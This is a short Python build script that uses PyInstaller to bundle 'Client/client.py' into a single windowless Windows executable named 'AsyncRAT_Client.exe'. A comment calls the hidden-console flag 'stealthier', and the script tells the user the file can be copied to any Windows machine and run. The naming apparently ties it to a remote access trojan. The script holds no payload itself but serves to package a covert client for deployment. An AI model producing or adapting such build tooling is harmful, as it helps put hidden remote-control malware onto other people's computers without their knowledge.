import os
import subprocess
import shutil

def build():
    print("Building Client for Windows (Single Executable)...")
    
    # Check for PyInstaller
    try:
        subprocess.check_call(['pyinstaller', '--version'])
    except:
        print("PyInstaller not found. Installing...")
        subprocess.check_call(['pip', 'install', 'pyinstaller'])

    client_script = os.path.join('Client', 'client.py')
    
    if not os.path.exists(client_script):
        print(f"Error: {client_script} not found!")
        return

    # Build command
    # --onefile: bundle everything into one exe
    # --noconsole: don't show black window when running (stealthier)
    # --name: name of the output file
    cmd = [
        'pyinstaller',
        '--onefile',
        '--noconsole',
        '--name', 'AsyncRAT_Client',
        client_script
    ]
    
    print(f"Running: {' '.join(cmd)}")
    subprocess.check_call(cmd)
    
    # Move artifact to 'Build' folder
    if not os.path.exists('Build'):
        os.makedirs('Build')
        
    dist_file = os.path.join('dist', 'AsyncRAT_Client.exe')
    target_file = os.path.join('Build', 'AsyncRAT_Client.exe')
    
    if os.path.exists(dist_file):
        shutil.move(dist_file, target_file)
        print(f"\n[+] Build Success!")
        print(f"[+] Client Executable: {os.path.abspath(target_file)}")
        print("\nYou can simply copy this .exe to any Windows machine and run it.")
    else:
        print("[-] Build failed: Output file not found.")

    # Cleanup build artifacts
    shutil.rmtree('build', ignore_errors=True)
    shutil.rmtree('dist', ignore_errors=True)
    if os.path.exists('AsyncRAT_Client.spec'):
        os.remove('AsyncRAT_Client.spec')

if __name__ == "__main__":
    build()
